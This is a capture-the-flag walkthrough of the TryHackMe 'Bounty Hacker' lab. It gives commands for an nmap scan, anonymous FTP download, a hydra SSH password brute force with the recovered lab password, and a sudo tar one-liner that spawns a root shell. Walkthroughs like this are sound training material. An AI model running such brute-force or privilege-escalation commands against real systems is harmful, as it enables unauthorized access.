---
title: TryHackMe | Bounty Hacker
author: Zeropio
date: 2022-09-29
categories: [TryHackMe, Rooms]
tags: [thm, linux]
permalink: /tryhackme/bounty-hacker
---

# Foothold

The nmap show:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
```

Try logging with **anonymous** is successful. Now we try getting all the ftp:

```console
zero@pio$ wget -m --no-passive ftp://anonymous@10.10.111.251
```

---

# Fingerprint

We found there a list of possible passwords plus a file signed by **Lin**. We can try bruteforcing the other service we have, ssh:

```console
zero@pio$ hydra -l lin -P locks.txt ssh://10.10.111.251

	[22][ssh] host: 10.10.111.251   login: lin   password: RedDr4gonSynd1cat3
```

---

# Privilege Escalation

We can see that we can use tar:

```console
lin@bountyhacker:$ sudo -l

		(root) /bin/tar
```

We can use this [GTFObin](https://gtfobins.github.io/gtfobins/tar/#sudo) to get a quick access:

```console
lin@bountyhacker:$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```